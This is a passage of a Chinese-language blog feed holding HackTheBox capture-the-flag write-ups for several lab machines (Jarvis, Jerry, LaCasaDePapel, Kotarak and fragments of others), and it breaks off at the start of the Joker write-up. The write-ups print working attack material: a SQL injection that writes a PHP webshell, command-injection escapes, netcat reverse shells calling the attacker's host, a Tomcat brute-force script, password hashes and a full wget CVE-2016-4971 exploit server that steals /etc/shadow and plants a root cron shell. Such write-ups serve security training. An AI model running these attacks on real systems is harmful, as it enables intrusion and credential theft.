<p><img src="/images/Jeeves/15.jpg" alt="15"></p>
<p>最后读取root的时候，读取另外一个数据流</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir &#x2F;R</span><br><span class="line">powershell Get-Content -Path &quot;hm.txt&quot; -Stream &quot;root.txt&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Jeeves/16.jpg" alt="16"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Jarvis</title>
    <url>/2020/06/29/HTB-Jarvis/</url>
    <content><![CDATA[<h1 id="Jarvis"><a href="#Jarvis" class="headerlink" title="Jarvis"></a>Jarvis</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Jarvis/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>先看那个高位http端口</p>
<p><img src="/images/Jarvis/2.jpg" alt="2"></p>
<p>看样子好像有一些防御设备的样子</p>
<p>80端口主页</p>
<p><img src="/images/Jarvis/3.jpg" alt="3"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>在room.php的cod参数发现注入漏洞</p>
<p><img src="/images/Jarvis/4.jpg" alt="4"></p>
<p><img src="/images/Jarvis/5.jpg" alt="5"></p>
<p>确认存在注入</p>
<p>回显字段数为7</p>
<p><img src="/images/Jarvis/6.jpg" alt="6"></p>
<p>确认回显位置</p>
<p><img src="/images/Jarvis/7.jpg" alt="7"></p>
<p>发现current_user和system_user()一致，确认为DBA</p>
<p><img src="/images/Jarvis/8.jpg" alt="8"></p>
<p>尝试读取apache记录web路径的文件<code>/etc/apache2/sites-enabled/000-default.conf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.143&#x2F;room.php?cod&#x3D;0 union select%20 1,2,3,load_file(&#39;&#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;000-default.conf&#39;),5,6,7#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Jarvis/12.jpg" alt="12"></p>
<p>发现路径为/var/www/html<br>写入webshell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 union select &quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;,2,3,4,5,6,7 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;evil.php&#39;#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Jarvis/9.jpg" alt="9"></p>
<p>反弹shell</p>
<p><img src="/images/Jarvis/10.jpg" alt="10"></p>
<p>成功反弹</p>
<p>顺便直接在反弹路径读到了mariaDB的连接信息</p>
<p><img src="/images/Jarvis/11.jpg" alt="11"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Jarvis/15.jpg" alt="15"></p>
<p>发现systemctl设置了suid，如果我们能找到个user权限的账号，提权就很方便了</p>
<p><img src="/images/Jarvis/13.jpg" alt="13"></p>
<p>发现能以pepper运行的py脚本，过去看看</p>
<p><img src="/images/Jarvis/14.jpg" alt="14"></p>
<p>看来它在执行系统命令ping，并限制了一些字符，但仍然存在缺陷</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -u pepper &#x2F;var&#x2F;www&#x2F;Admin-Utilities&#x2F;simpler.py -p</span><br><span class="line">$(bash)</span><br></pre></td></tr></table></figure>

<p>利用美元符号直接逃逸</p>
<p><img src="/images/Jarvis/16.jpg" alt="16"></p>
<p>之后就可以使用systemctl进行提权了</p>
<p>参考GTFObins</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;home&#x2F;pepper&#x2F;</span><br><span class="line">pepper@jarvis:~$ echo &#39;[Service]</span><br><span class="line">&gt; Type&#x3D;oneshot</span><br><span class="line">&gt; ExecStart&#x3D;&#x2F;bin&#x2F;sh -c &quot;nc 10.10.16.100 5555 -e &#x2F;bin&#x2F;bash&quot;</span><br><span class="line">&gt; [Install]</span><br><span class="line">&gt; WantedBy&#x3D;multi-user.target&#39; &gt; pwn.service</span><br><span class="line">systemctl link &#x2F;home&#x2F;pepper&#x2F;pwn.service </span><br><span class="line">systemctl start pwn.service </span><br></pre></td></tr></table></figure>

<p>创建服务类型oneshot<br>ExecStart放payload<br>link讲这个新建的服务连接到systemd<br>启动后就会执行命令</p>
<p><img src="/images/Jarvis/17.jpg" alt="17"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Jerry</title>
    <url>/2020/06/23/HTB-Jerry/</url>
    <content><![CDATA[<h1 id="Jerry"><a href="#Jerry" class="headerlink" title="Jerry"></a>Jerry</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Jerry/1.jpg" alt="1"></p>
<p>只发现了8080端口</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问8080，发现tomcat</p>
<p><img src="/images/Jerry/2.jpg" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="上传war"><a href="#上传war" class="headerlink" title="上传war"></a>上传war</h3><p>理想中的渗透方式为登录后台，上传evil.war，触发reverse_shell</p>
<p>尝试弱口令登录后台，<a href="https://github.com/govolution/betterdefaultpasslist">字典链接</a><br>爆破脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">with open(&quot;tomcat.txt&quot;) as f:</span><br><span class="line">    for line in f:</span><br><span class="line">        c&#x3D;line.strip(&#39;\n&#39;).split(&quot;:&quot;)</span><br><span class="line">        r&#x3D;requests.get(&#39;http:&#x2F;&#x2F;10.10.10.95:8080&#x2F;manager&#x2F;html&#39;, auth&#x3D;(c[0], c[1]))</span><br><span class="line">        </span><br><span class="line">        if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">            print &quot;Found valid credentials \&quot;&quot; + line.strip(&#39;\n&#39;) + &quot;\&quot;&quot;</span><br><span class="line">            raise sys.exit()</span><br></pre></td></tr></table></figure>

<p><img src="/images/Jerry/3.jpg" alt="3"></p>
<p>很快找出了账号密码<code>tomcat:s3cret</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.10.16.99 LPORT&#x3D;4444 -f war -o evil.war</span><br></pre></td></tr></table></figure>

<p>上传触发，getshell</p>
<p><img src="/images/Jerry/4.jpg" alt="4"></p>
<p>直接为system</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:LaCasaDePapel</title>
    <url>/2020/06/29/HTB-LaCasaDePapel/</url>
    <content><![CDATA[<h1 id="LaCasaDePapel"><a href="#LaCasaDePapel" class="headerlink" title="LaCasaDePapel"></a>LaCasaDePapel</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/LaCasaDePapel/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>先从21端口，vsftpd开始干<br>因为这个程序也许会存在后门，之前利用过，漏洞细节<a href="https://subscription.packtpub.com/book/networking_and_servers/9781786463166/1/ch01lvl1sec18/vulnerability-analysis-of-vsftpd-2-3-4-backdoor">链接</a></p>
<p>尝试msf，无法获得shell<br>查看原因</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show advanced options</span><br><span class="line">set VERBOSE true</span><br></pre></td></tr></table></figure>

<p><img src="/images/LaCasaDePapel/2.jpg" alt="2"></p>
<p>6200端口不是一个shell，手动复现漏洞看看，这个漏洞很容易复现</p>
<p>连接21，发送用户名<code>:)</code>密码任意</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 10.10.10.131 21</span><br><span class="line">USER :)</span><br><span class="line">PASS any</span><br></pre></td></tr></table></figure>

<p>之后连接21端口，理论上就会有shell</p>
<p><img src="/images/LaCasaDePapel/3.jpg" alt="3"></p>
<p>不过这次好像是个psy shell</p>
<p>测试后发现，以先常见的执行系统吗命令的函数都无法使用，<code>echo</code>这样的命令还是可以执行的<br>我们使用phpinfo()函数，看能否执行</p>
<p><img src="/images/LaCasaDePapel/4.jpg" alt="4"></p>
<p>执行成功，看到了很多被禁用的函数<br>但我们可以使用scandir()显示目录、file_get_contents()读取文件来造成信息泄露</p>
<p><img src="/images/LaCasaDePapel/5.jpg" alt="5"></p>
<p>终于发现了有价值的信息，一个私钥</p>
<p>访问目标443，提示证书错误</p>
<p><img src="/images/LaCasaDePapel/6.jpg" alt="6"></p>
<p>导出它的公钥</p>
<p><img src="/images/LaCasaDePapel/7.jpg" alt="7"></p>
<p>比较根据私钥生成的公钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl pkey -in ca.key -pubout</span><br><span class="line">openssl x509 -in ca.crt -pubkey -noout</span><br></pre></td></tr></table></figure>

<p><img src="/images/LaCasaDePapel/8.jpg" alt="8"></p>
<p>确认一致</p>
<p>搞定证书签名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out client.key 4096</span><br><span class="line">openssl req -new -key client.key -out client.csr</span><br><span class="line">openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -set_serial 200 -extensions client -days 365 -outform PEM -out client.cer</span><br><span class="line">openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12</span><br></pre></td></tr></table></figure>

<p><img src="/images/LaCasaDePapel/9.jpg" alt="9"></p>
<p>添加信任</p>
<p><img src="/images/LaCasaDePapel/10.jpg" alt="10"></p>
<p>重新访问</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p><img src="/images/LaCasaDePapel/11.jpg" alt="11"></p>
<p>之后页面发生了变化<br>随便点点，发现了url参数path=<br>尝试文件包含漏洞</p>
<p><img src="/images/LaCasaDePapel/12.jpg" alt="12"></p>
<p>确认是存在漏洞</p>
<p>点击<code>.ssh</code>发现了私钥</p>
<p><img src="/images/LaCasaDePapel/15.jpg" alt="15"></p>
<p>而且发现，原来页面的avi点击后可进行下载操作，而且file/后的路径经过base64编码</p>
<p><img src="/images/LaCasaDePapel/13.jpg" alt="13"></p>
<p><img src="/images/LaCasaDePapel/14.jpg" alt="14"></p>
<p>看来它的下载请求是<code>file/base64(下载路径)</code><br>所以我们想下载私钥需要构造以下url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#echo -n ..&#x2F;.ssh&#x2F;id_rsa |base64</span><br><span class="line">Li4vLnNzaC9pZF9yc2E&#x3D;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;10.10.10.131&#x2F;file&#x2F;Li4vLnNzaC9pZF9yc2E&#x3D;</span><br></pre></td></tr></table></figure>

<p>这个地方好像有防御机制，如果输错了，443端口就给关了</p>
<p><img src="/images/LaCasaDePapel/16.jpg" alt="16"></p>
<p>成功登录shell</p>
<h3 id="另一个思路"><a href="#另一个思路" class="headerlink" title="另一个思路"></a>另一个思路</h3><p>利用6200的psyshell，可以发现，用户berlin的.ssh目录无法访问，但是dali的.ssh可以访问</p>
<p><img src="/images/LaCasaDePapel/17.jpg" alt="17"></p>
<p>我们可以自己生成ssh密钥对</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -f dali</span><br><span class="line">cat dali.pub</span><br></pre></td></tr></table></figure>

<p>利用php函数<code>file_put_contents</code>对它的<code>authorized_keys</code>追加一个我们的公钥</p>
<p><img src="/images/LaCasaDePapel/18.jpg" alt="18"></p>
<p>这样我们就可以利用生成的私钥进行登录</p>
<p><img src="/images/LaCasaDePapel/19.jpg" alt="19"></p>
<p>可惜仍然是一个psyshell<br>不过既然ssh成功登录，就可以使用隧道进行内网攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -D 8001 -i dali dali@10.10.10.131</span><br></pre></td></tr></table></figure>

<p>配置proxychains的socks5 80001</p>
<p>使用nmap进行扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sT -Pn -n -p- 127.0.0.1</span><br></pre></td></tr></table></figure>

<p><img src="/images/LaCasaDePapel/20.jpg" alt="20"></p>
<p>扫描发现内网8000端口处于开启</p>
<p>浏览器挂上socks代理到127.0.0.1的8001端口</p>
<p>之后访问127.0.0.1:8000</p>
<p><img src="/images/LaCasaDePapel/21.jpg" alt="21"></p>
<p>我们成功发现了这个存在任意文件下载的漏洞地址</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>该方法来源于官方write up</p>
<p><img src="/images/LaCasaDePapel/22.jpg" alt="22"></p>
<p>在主目录下发现创建者为root的ini文件<br>我们可以看到这个文件的行为</p>
<p><img src="/images/LaCasaDePapel/23.jpg" alt="23"></p>
<p>在进程里可以发现UID65534的用户nobody在调用这个文件</p>
<p><img src="/images/LaCasaDePapel/24.jpg" alt="24"></p>
<p>不过我们并不能在进程里看到那个.ini文件的执行，这有点奇怪，也是难点</p>
<p>通过文件行为，我们可以确认那个ini是由root来执行的，我们没有修改权限，但我们可以重新创建一个文件</p>
<p><img src="/images/LaCasaDePapel/25.jpg" alt="25"></p>
<p>成功获取root</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Kotarak</title>
    <url>/2020/06/23/HTB-Kotarak/</url>
    <content><![CDATA[<h1 id="Kotarak"><a href="#Kotarak" class="headerlink" title="Kotarak"></a>Kotarak</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Kotarak/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>先访问目标的8080端口，可以发现目标正在运行这tomcat<br>先不进行暴力破解，防止被锁，去查看60000这个特殊端口</p>
<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>该页面提示我们它提供了一个匿名访问的接口，这种接口通常伴随SSRF漏洞<br>我们尝试让其访问kali的80端口，发现确实存在访问请求</p>
<p><img src="/images/Kotarak/2.jpg" alt="2"></p>
<p>通过这点我们可以尝试:内网端口扫描、任意文件读取、服务版本获取、数据库未授权访问等</p>
<p>尝试进行文件读取：失败</p>
<p><img src="/images/Kotarak/3.jpg" alt="3"></p>
<p>尝试内网扫描<br>先尝试已确认的开放端口，发现如果端口开放，会直接回显页面内容</p>
<p><img src="/images/Kotarak/4.jpg" alt="4"></p>
<p>使用wfuzz进行端口扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c -z range,1-65535  http:&#x2F;&#x2F;10.10.10.55:60000&#x2F;url.php?path&#x3D;http:&#x2F;&#x2F;127.0.0.1:FUZZ</span><br></pre></td></tr></table></figure>

<p>进一步过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c -z range,1-65535 --hl&#x3D;2 http:&#x2F;&#x2F;10.10.10.55:60000&#x2F;url.php?path&#x3D;http:&#x2F;&#x2F;127.0.0.1:FUZZ</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kotarak/5.jpg" alt="5"></p>
<p>我们已经发现了内网存在的端口了，尝试逐个访问<br>在888端口有了发现</p>
<p><img src="/images/Kotarak/6.jpg" alt="6"></p>
<p>直接访问是不行的，我们可以通过ssrf配合相对路径进行访问</p>
<p><img src="/images/Kotarak/7.jpg" alt="7"></p>
<p>访问时由于存在两个query string，还需要对路径进行url编码</p>
<p><img src="/images/Kotarak/8.jpg" alt="8"></p>
<p>最终查看到了tomcat的密码</p>
<p>或者之前的输入框里输入url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:888&#x2F;?doc&#x3D;backup</span><br></pre></td></tr></table></figure>

<p>之后到一个空白页面</p>
<p><img src="/images/Kotarak/10.jpg" alt="10"></p>
<p>查看网页源代码即可</p>
<p><img src="/images/Kotarak/11.jpg" alt="11"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="tomcat上传getshell"><a href="#tomcat上传getshell" class="headerlink" title="tomcat上传getshell"></a>tomcat上传getshell</h3><p>登录tomcat，账号密码<code>admin/3@g01PdhB!</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.10.16.99 LPORT&#x3D;4444 -f war -o evil.war</span><br></pre></td></tr></table></figure>

<p>成功上传，getshell</p>
<p><img src="/images/Kotarak/13.jpg" alt="13"></p>
<p>升级为交互式shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">Ctrl+Z</span><br><span class="line">stty raw -echo</span><br><span class="line">fg</span><br><span class="line">reset</span><br><span class="line">xterm-color</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Kotarak/14.jpg" alt="14"></p>
<p>在home目录下发现了有域文件.dit和.bin，全部传输到kali</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 5555 &gt; a.bin</span><br><span class="line">nc 10.10.16.99 5555 &lt; 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin </span><br><span class="line">nc -lvp 5555 &gt; a.dit</span><br><span class="line">nc 10.10.16.99 5555 &lt; 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit</span><br></pre></td></tr></table></figure>

<p>解开域数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -system a.bin -ntds a.dit LOCAL</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kotarak/15.jpg" alt="15"></p>
<p>尝试破解hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::</span><br><span class="line">atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::</span><br></pre></td></tr></table></figure>

<p>hashcat</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat64.exe -m 1000 -a 0 test.txt rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kotarak/16.jpg" alt="16"></p>
<p><code>Administrator/f16tomcat!</code><br><code>atanas/Password123!</code></p>
<p>这里有坑，切换用户的时候，账号密码换了组合<code>atanas/f16tomcat!</code></p>
<p>切换后再扫一下</p>
<p><img src="/images/Kotarak/17.jpg" alt="17"></p>
<p>在root目录发现了日志</p>
<p><img src="/images/Kotarak/18.jpg" alt="18"></p>
<p>并且很神奇，我们可以读root目录下的flag.txt，不过里面并没有flag</p>
<p><img src="/images/Kotarak/22.jpg" alt="22"></p>
<p>还是要更进一步，通过log我们可以发现，10.10.3.133这台机器一直在向我们拿下user权限的机器10.10.10.55发送wget请求<br>而且我们可以基本可以判断10.10.3.133是一台虚拟化设备(网卡lxcbr0)，看样子对方的wget请求是一个cronjobs</p>
<p><img src="/images/Kotarak/23.jpg" alt="23"></p>
<p>通过搜索公开漏洞，发现CVE-2016-4971</p>
<p><img src="/images/Kotarak/19.jpg" alt="19"></p>
<p>其利用原理是A发送wget请求B机器上的资源，我们控制B让其返回302重定向，重定向到我们的kali机器ftp服务的恶意文件，此时wget请求会信任这个302请求，不会验证文件，从而下载kali机器ftp服务上的恶意文件，导致RCE</p>
<p>现在我们需要完成这个exp的过程</p>
<p>首先在kali上，开启ftp服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;tmp&#x2F;ftptest</span><br><span class="line">cd &#x2F;tmp&#x2F;ftptest</span><br><span class="line">cat &lt;&lt;_EOF_&gt;.wgetrc</span><br><span class="line">post_file &#x3D; &#x2F;etc&#x2F;shadow</span><br><span class="line">output_document &#x3D; &#x2F;etc&#x2F;cron.d&#x2F;wget-root-shell</span><br><span class="line">_EOF_</span><br><span class="line">pip install pyftpdlib</span><br><span class="line">cat .wgetrc</span><br><span class="line">python -m pyftpdlib -p21</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kotarak/24.jpg" alt="24"></p>
<p>修改40064.txt中py代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;本地监听端口</span><br><span class="line">HTTP_LISTEN_IP &#x3D; &#39;0.0.0.0&#39;</span><br><span class="line">HTTP_LISTEN_PORT &#x3D; 80</span><br><span class="line">&#x2F;&#x2F;302重定向端口</span><br><span class="line">FTP_HOST &#x3D; &#39;10.10.16.99&#39;</span><br><span class="line">FTP_PORT &#x3D; 21</span><br><span class="line">&#x2F;&#x2F;payload为reverse_shell</span><br><span class="line">ROOT_CRON &#x3D; &quot;* * * * * root rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.99 4444 &gt;&#x2F;tmp&#x2F;f \n&quot;</span><br></pre></td></tr></table></figure>

<p>完整如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> SimpleHTTPServer</span><br><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"><span class="keyword">import</span> socket;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wgetExploit</span>(<span class="params">SimpleHTTPServer.SimpleHTTPRequestHandler</span>):</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="comment"># This takes care of sending .wgetrc</span></span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;We have a volunteer requesting &quot;</span> + self.path + <span class="string">&quot; by GET :)\n&quot;</span></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&quot;Wget&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.headers.getheader(<span class="string">&#x27;User-Agent&#x27;</span>):</span><br><span class="line">          <span class="built_in">print</span> <span class="string">&quot;But it&#x27;s not a Wget :( \n&quot;</span></span><br><span class="line">          self.send_response(<span class="number">200</span>)</span><br><span class="line">          self.end_headers()</span><br><span class="line">          self.wfile.write(<span class="string">&quot;Nothing to see here...&quot;</span>)</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Uploading .wgetrc via ftp redirect vuln. It should land in /root \n&quot;</span></span><br><span class="line">       self.send_response(<span class="number">301</span>)</span><br><span class="line">       new_path = <span class="string">&#x27;%s&#x27;</span>%(<span class="string">&#x27;ftp://anonymous@%s:%s/.wgetrc&#x27;</span>%(FTP_HOST, FTP_PORT) )</span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Sending redirect to %s \n&quot;</span>%(new_path)</span><br><span class="line">       self.send_header(<span class="string">&#x27;Location&#x27;</span>, new_path)</span><br><span class="line">       self.end_headers()</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">do_POST</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="comment"># In here we will receive extracted file and install a PoC cronjob</span></span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;We have a volunteer requesting &quot;</span> + self.path + <span class="string">&quot; by POST :)\n&quot;</span></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&quot;Wget&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.headers.getheader(<span class="string">&#x27;User-Agent&#x27;</span>):</span><br><span class="line">          <span class="built_in">print</span> <span class="string">&quot;But it&#x27;s not a Wget :( \n&quot;</span></span><br><span class="line">          self.send_response(<span class="number">200</span>)</span><br><span class="line">          self.end_headers()</span><br><span class="line">          self.wfile.write(<span class="string">&quot;Nothing to see here...&quot;</span>)</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">       content_len = <span class="built_in">int</span>(self.headers.getheader(<span class="string">&#x27;content-length&#x27;</span>, <span class="number">0</span>))</span><br><span class="line">       post_body = self.rfile.read(content_len)</span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n&quot;</span> % (post_body)</span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Sending back a cronjob script as a thank-you for the file...&quot;</span> </span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;It should get saved in /etc/cron.d/wget-root-shell on the victim&#x27;s host (because of .wgetrc we injected in the GET first response)&quot;</span></span><br><span class="line">       self.send_response(<span class="number">200</span>)</span><br><span class="line">       self.send_header(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">       self.end_headers()</span><br><span class="line">       self.wfile.write(ROOT_CRON)</span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;\nFile was served. Check on /root/hacked-via-wget on the victim&#x27;s host in a minute! :) \n&quot;</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">HTTP_LISTEN_IP = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">HTTP_LISTEN_PORT = <span class="number">80</span></span><br><span class="line">FTP_HOST = <span class="string">&#x27;10.10.16.99&#x27;</span></span><br><span class="line">FTP_PORT = <span class="number">21</span></span><br><span class="line"></span><br><span class="line">ROOT_CRON = <span class="string">&quot;* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.99 4444 &gt;/tmp/f \n&quot;</span></span><br><span class="line"></span><br><span class="line">handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Ready? Is your FTP server running?&quot;</span></span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">result = sock.connect_ex((FTP_HOST, FTP_PORT))</span><br><span class="line"><span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;FTP found open on %s:%s. Let&#x27;s go then\n&quot;</span> % (FTP_HOST, FTP_PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;FTP is down :( Exiting.&quot;</span></span><br><span class="line">   exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Serving wget exploit on port %s...\n\n&quot;</span> % HTTP_LISTEN_PORT</span><br><span class="line"></span><br><span class="line">handler.serve_forever()</span><br></pre></td></tr></table></figure>

<p>传输到user权限的机器上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444 &gt; exp.py</span><br><span class="line">nc 10.10.10.55 4444 &lt; exp.py</span><br></pre></td></tr></table></figure>

<p>之后运行脚本即可，由于我们需要使用非root用户监听1024以下端口(这里为80)，所以需要使用authbind，恰好这台机器上也有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">authbind python exp.py</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kotarak/20.jpg" alt="20"></p>
<p>我们看到.wgetrc被下载，等待2分钟，成功获取root</p>
<p><img src="/images/Kotarak/21.jpg" alt="21"></p>
<p>PATH没设置环境变量/sbin，通过/sbin/ifconfig看到ip为10.0.3.133，至此我们成功获取另一台机器的root</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Joker</title>
    <url>/2020/10/20/HTB-Joker/</url>
    <content><![CDATA[<h1 id="Joker"><a href="#Joker" class="headerlink" title="Joker"></a>Joker</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Joker/1.png" alt="1"></p>
<p>TCP扫描发现squid-http，一个http正向代理服务和ssh，这两个服务很难突破</p>
<p>尝试UDP扫描</p>
<p><img src="/images/Joker/2.png" alt="2"></p>
<p>发现了tftp</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>唯一突破点可能是tftp，尝试下载文件</p>
